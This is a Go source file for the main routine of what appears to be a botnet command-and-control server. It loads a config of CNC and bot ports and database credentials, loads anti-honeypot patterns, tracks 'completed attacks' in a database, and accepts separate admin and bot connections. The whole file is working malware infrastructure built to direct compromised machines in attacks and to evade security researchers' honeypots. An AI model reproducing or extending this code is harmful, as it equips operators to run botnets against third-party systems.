package main

import (
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"time"
)

type Config struct {
	CncIP            string `json:"cnc_ip"`
	CncPort          string `json:"cnc_port"`
	BotPort          string `json:"bot_port"`
	ApiPort          string `json:"api_port"`
	DatabaseIP       string `json:"database_ip"`
	DatabaseName     string `json:"database_name"`
	DatabaseUser     string `json:"database_user"`
	DatabasePassword string `json:"database_password"`
	IPInfoToken      string `json:"ipinfo_token"`
	GobalSlot        int    `json:"gobal_slot"`
	Version          string `json:"version"`
	AntiHoneypot     bool   `json:"anti_honeypot"`
	AntiDuplicate    bool   `json:"anti_duplicate"`
}

var config *Config
var clientList *ClientList = NewClientList()
var database *Database

func loadConfig() (*Config, error) {
	file, err := os.Open("config.json")
	if err != nil {
		return nil, fmt.Errorf("failed to open config.json: %v", err)
	}
	defer file.Close()

	var cfg Config
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&cfg)
	if err != nil {
		return nil, fmt.Errorf("failed to decode config.json: %v", err)
	}

	if cfg.CncIP == "" || cfg.CncPort == "" || cfg.BotPort == "" || cfg.ApiPort == "" || cfg.DatabaseIP == "" || cfg.DatabaseName == "" || cfg.DatabaseUser == "" || cfg.DatabasePassword == "" || cfg.IPInfoToken == "" || cfg.GobalSlot <= 0 || cfg.Version == "" {
		return nil, fmt.Errorf("missing required configuration fields or invalid gobal_slot")
	}
	return &cfg, nil
}

func main() {
	rand.Seed(time.Now().UnixNano())

	if err := InitLoggers(); err != nil {
		log.Fatalf("Failed to initialize loggers: %v", err)
	}

	var err error
	config, err = loadConfig()
	if err != nil {
		ErrorLogger.Fatalln("Failed to load config:", err)
	}
	InfoLogger.Println("Configuration loaded successfully.")

	database = NewDatabase(config.DatabaseIP, config.DatabaseUser, config.DatabasePassword, config.DatabaseName)
	if database == nil {
		ErrorLogger.Fatalln("Failed to initialize database")
	}
	InfoLogger.Println("Database initialized successfully.")

	err = loadHoneypotPatterns("honeypot.json")
	if err != nil {
		ErrorLogger.Printf("Failed to load honeypot patterns: %v", err)
	} else {
		InfoLogger.Printf("Loaded %d honeypot patterns", len(honeypotPatterns))
	}

	_, err = database.db.Exec("UPDATE users SET online = 0")
	if err != nil {
		ErrorLogger.Println("Error resetting user online status:", err)
		return
	}
	InfoLogger.Println("Reset all user online statuses to 0.")

	go func() {
		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ticker.C:
				rowsAffected, err := database.MarkCompletedAttacks()
				if err != nil {
					ErrorLogger.Println("Error updating completed attacks:", err)
				}
				if rowsAffected > 0 {
					InfoLogger.Printf("Marked %d attacks as completed.", rowsAffected)
				}
			}
		}
	}()

	adminAddress := fmt.Sprintf("%s:%s", config.CncIP, config.CncPort)
	adminListener, err := net.Listen("tcp", adminAddress)
	if err != nil {
		ErrorLogger.Fatalf("Failed to listen on admin port %s: %v", adminAddress, err)
	}
	InfoLogger.Printf("Admin CNC server listening on %s", adminAddress)

	botAddress := fmt.Sprintf("%s:%s", config.CncIP, config.BotPort)
	botListener, err := net.Listen("tcp", botAddress)
	if err != nil {
		ErrorLogger.Fatalf("Failed to listen on bot port %s: %v", botAddress, err)
	}
	InfoLogger.Printf("Bot server listening on %s", botAddress)

	go StartAPIServer(config.ApiPort)

	go func() {
		for {
			conn, err := adminListener.Accept()
			if err != nil {
				ErrorLogger.Println("Failed to accept admin connection:", err)
				continue
			}
			go adminConnectionHandler(conn)
		}
	}()

	go func() {
		for {
			conn, err := botListener.Accept()
			if err != nil {
				ErrorLogger.Println("Failed to accept bot connection:", err)
				continue
			}
			go botConnectionHandler(conn)
		}
	}()

	select {}
}
